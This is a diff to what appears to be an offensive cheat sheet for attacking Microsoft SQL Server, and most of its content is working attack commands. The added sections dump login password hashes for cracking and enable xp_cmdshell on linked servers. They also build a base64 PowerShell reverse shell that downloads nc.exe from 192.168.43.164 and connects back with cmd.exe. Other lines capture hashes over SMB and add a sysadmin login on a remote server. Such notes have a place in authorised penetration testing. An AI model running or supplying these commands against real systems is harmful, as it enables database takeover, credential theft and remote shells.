@@ -86,11 +86,16 @@ EXEC master..xp_fileexist '\\<ip>\anything\'
 ```
 
 ## reverseshell
-python 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\temp\nc.exe"); c:\windows\temp\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
+python -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\temp\nc.exe"); c:\windows\temp\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
 ```
 exec xp_cmdshell 'powershell -exec bypass -enc <b64_payload>
 ```
 
+
+## extract hash for cracking
+```
+SELECT @@SERVERNAME + N'_' + [name] + N':' + CONVERT(NVARCHAR(256), password_hash, 1) FROM sys.sql_logins WHERE [name] NOT LIKE N'##%';
+```
 
 ## read file (OPENROWSET)
 ```
@@ -131,7 +136,7 @@ SELECT * FROM OPENQUERY("<srvname>",'SELECT name FROM master.dbo.sysdatabases')
 SELECT name FROM master.dbo.sysdatabases
 ```
 
-## enum - Get tables of a databases
+## Trustable Links - Get tables of a databases
 ```
 SELECT * FROM OPENQUERY("<srvname>",'SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES')
 ```
@@ -147,3 +152,29 @@ EXECUTE('EXECUTE(''CREATE LOGIN <login|jubeaz> WITH PASSWORD = ''''<password|Jub
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''<login|jubeaz>'''' , ''''sysadmin'''' '') AT "<remote_srvname>"') AT "<local_srvname>"
 ```
 
+
+## Trustable Links - turns on advanced options
+```
+select 1 from openquery("<remote_srvname>", 'select 1; exec sp_configure ''show advanced options'', 1; reconfigure')
+EXECUTE('sp_configure ''show advanced options'',1;reconfigure;') AT "<remote_srvname>"
+```
+
+## Trustable Links -  enable xp_cmdshell 
+```
+select 1 from openquery("<remote_srvname>", 'select 1; exec sp_configure ''xp_cmdshell'', 1; reconfigure')
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<remote_srvname>"
+```
+
+
+## Trustable Links - test command exec 
+if return 1 its good
+```
+select 1 from openquery("<remote_srvname>", 'select 1; exec master..xp_cmdshell ''dir c:''')
+```
+
+
+## Trustable Links - reverseshell
+python -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\temp\nc.exe"); c:\windows\temp\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
+```
+select 1 from openquery("<remote_srvname>", 'select 1; exec master..xp_cmdshell ''powershell -exec bypass -enc <b64_payload>''')
+```
